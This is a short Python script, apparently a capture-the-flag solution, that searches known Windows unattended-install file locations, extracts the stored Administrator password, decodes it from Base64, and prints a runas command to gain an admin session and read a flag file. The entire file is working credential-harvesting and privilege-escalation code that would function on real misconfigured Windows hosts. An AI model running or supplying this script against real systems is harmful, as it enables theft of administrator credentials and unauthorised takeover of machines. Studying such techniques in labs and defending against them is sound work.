#!/usr/bin/env python3
"""Locate Windows unattended-install files, extract the Administrator
password, decode it, and use runas to open an admin session."""

import os
import re
import base64
import subprocess

# 1. Common locations where unattended install files are left behind
SEARCH_PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Autounattend.xml",
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\Windows\System32\Sysprep\Unattend.xml",
    r"C:\Windows\System32\Sysprep\Panther\Unattend.xml",
    r"C:\unattend.xml",
    r"C:\sysprep.inf",
    r"C:\sysprep\sysprep.xml",
]

# regex for the password value inside <AdministratorPassword>
PW_RE = re.compile(
    r"<AdministratorPassword>.*?<Value>(.*?)</Value>",
    re.IGNORECASE | re.DOTALL,
)


def find_files():
    """Return the unattended files that actually exist on this host."""
    return [p for p in SEARCH_PATHS if os.path.isfile(p)]


def extract_password(path):
    """Pull the raw <Value> for AdministratorPassword from one file."""
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        data = fh.read()
    match = PW_RE.search(data)
    return match.group(1) if match else None


def decode_password(raw):
    """Unattend passwords are Base64 of the UTF-16LE string with the
    literal suffix 'AdministratorPassword' appended before encoding.
    Try to decode; fall back to the raw value if it isn't valid Base64."""
    try:
        decoded = base64.b64decode(raw).decode("utf-16-le", errors="ignore")
        # Windows appends the field name before encoding; strip it
        if decoded.endswith("AdministratorPassword"):
            decoded = decoded[: -len("AdministratorPassword")]
        return decoded
    except Exception:
        return raw


def main():
    files = find_files()
    if not files:
        print("[-] No unattended install files found.")
        return

    for path in files:
        print(f"[+] Found: {path}")
        raw = extract_password(path)
        if not raw:
            print("    [-] No AdministratorPassword value in this file.")
            continue

        print(f"    [*] Raw value: {raw}")
        password = decode_password(raw)
        print(f"    [+] Decoded password: {password}")

        # 4. Open an Administrator session and read the flag from its Desktop
        cmd = (
            'runas /user:Administrator '
            '"cmd /c type C:\\Users\\Administrator\\Desktop\\flag.txt '
            '> C:\\Users\\Public\\flag_out.txt"'
        )
        print(f"    [*] Run this to authenticate as admin:\n    {cmd}")
        print("    [*] (runas will prompt for the password above — paste it.)")


if __name__ == "__main__":
    main()
